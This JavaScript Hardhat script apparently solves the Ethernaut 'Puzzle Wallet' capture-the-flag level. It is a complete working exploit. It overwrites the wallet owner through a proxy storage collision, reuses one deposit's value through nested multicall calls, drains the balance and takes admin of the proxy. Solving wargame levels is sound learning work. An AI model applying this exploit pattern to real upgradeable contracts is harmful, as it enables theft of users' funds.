const { ethers } = require('hardhat');
const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const puzzleProxyContract = '0x4AED70ac7B680B5DBe9cBCfF98811bC0E9Cbd672';
  const puzzleWalletContract = '0x330e6C18cCa0F364502e886762c383a758e756e5';

  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const puzzleProxy = await ethers.getContractAt('PuzzleProxy', puzzleProxyContract);
  const puzzleWallet = await ethers.getContractAt('PuzzleWallet', puzzleProxyContract);
  console.log(await puzzleProxy.pendingAdmin());

  if ((await puzzleProxy.pendingAdmin()) != deployer.address) {
    const tx1 = await puzzleProxy.proposeNewAdmin(deployer.address, { gasLimit: 300000 });
    await tx1.wait();
  }
  await puzzleWallet.connect(deployer).addToWhitelist(deployer.address);

  const data1 = puzzleWallet.interface.encodeFunctionData('deposit');
  const data2 = puzzleWallet.interface.encodeFunctionData('multicall', [[data1]]);

  const balanceWallet = await ethers.provider.getBalance(puzzleWallet.address);

  await puzzleWallet.connect(deployer).multicall([data1, data2], {
    value: balanceWallet
  });

  await puzzleWallet.connect(deployer).execute(deployer.address, balanceWallet.mul(2), '0x');

  await puzzleWallet.connect(deployer).setMaxBalance(ethers.BigNumber.from(deployer.address));

  console.log('Ownership taken');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
